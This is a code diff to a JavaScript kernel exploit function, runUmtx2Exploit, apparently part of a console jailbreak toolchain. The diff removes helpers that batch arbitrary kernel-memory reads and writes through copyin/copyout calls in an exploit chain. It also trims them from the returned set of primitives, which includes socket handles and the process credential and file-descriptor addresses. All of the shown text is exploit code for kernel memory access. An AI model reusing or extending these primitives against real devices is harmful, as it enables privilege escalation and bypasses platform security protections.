@@ -1470,55 +1470,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
     await log(`Done! Exploit took:   ${toHumanReadableTime(totalDuration)}`, LogLevel.SUCCESS);
     if (debug) await log(`checkMemoryAccessFailCount: ${checkMemoryAccessFailCount}`, LogLevel.INFO);
 
-    const BATCH_MAX = 128;
-    const batchSlots = [];
-    for (var _bi = 0; _bi < BATCH_MAX; _bi++) batchSlots.push(p.malloc(0x8, 1));
-    var batchIdx = 0;
-    var batchReadSlots = [];
-
-    function batchReset() {
-        batchIdx = 0;
-        batchReadSlots = [];
-    }
-
-    function batchPushWrite4(kaddr, val) {
-        var buf = batchSlots[batchIdx++];
-        p.write4(buf, val);
-        chainPushCopyin(buf, false, kaddr, false, 0x4);
-    }
-
-    function batchPushRead4(kaddr) {
-        var buf = batchSlots[batchIdx++];
-        chainPushCopyout(kaddr, false, buf, false, 0x4);
-        batchReadSlots.push(buf);
-        return batchReadSlots.length - 1;
-    }
-
-    function batchPushWrite8(kaddr, val) {
-        var buf = batchSlots[batchIdx++];
-        p.write8(buf, val);
-        chainPushCopyin(buf, false, kaddr, false, 0x8);
-    }
-
-    function batchPushRead8(kaddr) {
-        var buf = batchSlots[batchIdx++];
-        chainPushCopyout(kaddr, false, buf, false, 0x8);
-        batchReadSlots.push(buf);
-        return batchReadSlots.length - 1;
-    }
-
-    async function batchFlush() {
-        await chain.run();
-    }
-
-    function batchGet4(idx) {
-        return p.read4(batchReadSlots[idx]);
-    }
-
-    function batchGet8(idx) {
-        return p.read8(batchReadSlots[idx]);
-    }
-
     return {
         masterSock: masterSock,
         victimSock: victimSock,
@@ -1537,14 +1488,6 @@ async function runUmtx2Exploit(p, chain, log = async () => { }) {
         procUcredAddr: curprocUcred,
         procFdAddr: curprocFd,
         pipeAddr: pipeAddr,
-        pipeMem: pipeMem,
-        batchReset: batchReset,
-        batchPushWrite4: batchPushWrite4,
-        batchPushRead4: batchPushRead4,
-        batchPushWrite8: batchPushWrite8,
-        batchPushRead8: batchPushRead8,
-        batchFlush: batchFlush,
-        batchGet4: batchGet4,
-        batchGet8: batchGet8
+        pipeMem: pipeMem
     };
 }
